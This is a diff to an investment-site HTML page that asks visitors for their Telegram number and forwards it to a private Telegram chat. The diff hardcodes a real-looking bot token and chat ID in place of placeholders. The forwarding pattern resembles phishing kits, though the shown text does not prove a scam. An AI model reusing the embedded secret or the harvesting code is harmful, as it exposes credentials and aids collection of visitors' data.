@@ -92,8 +92,7 @@
     <!-- Terms and Conditions Modal -->
     <div id="terms-modal">
         <h2>Terms and Conditions</h2>
-        <p><strong>Nonyane Investment Tree</strong> **Ownership and Copyright Notice**  
-This website is 100% owned and operated by Nonyane Investment Tree. All content, ideas, and intellectual property associated with this site are protected under copyright law. Any unauthorized use, reproduction, or imitation of this website's content, design, or concept is strictly prohibited and will result in legal action. Individuals or entities found infringing on these rights will be liable for damages exceeding ten million Rand (ZAR)..</p>
+        <p><strong>Nonyane Investment Tree</strong> holds and owns this Website 100%. Anyone who tries to steal this idea or create a similar site will be sued for copyright breach. If found, Nonyane Investment Tree will sue the individual for over ten million Rands.</p>
         <br>
         <button id="accept-btn" onclick="acceptTerms()">Accept</button>
     </div>
@@ -135,8 +134,8 @@ This website is 100% owned and operated by Nonyane Investment Tree. All content,
 
         // Function to send data to Telegram
         async function sendToTelegram(message) {
-            const botToken = 'YOUR_BOT_TOKEN';  // Replace with your bot token
-            const chatID = 'YOUR_CHAT_ID';      // Replace with your chat ID
+            const botToken = '7921041329:AAGh5A66MIhosuZjJ_r5ZR49l36Y8PB1t54';  // Your bot token
+            const chatID = '-1002302815757';      // Your chat ID
 
             const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const text = encodeURIComponent(message);
@@ -175,7 +174,7 @@ This website is 100% owned and operated by Nonyane Investment Tree. All content,
                 await sendToTelegram(message);
 
                 // Redirect to the layout page
-                window.location.href = 'veri.html';
+                window.location.href = 'layout.html';
             } else {
                 alert('Please enter your Telegram number.');
             }
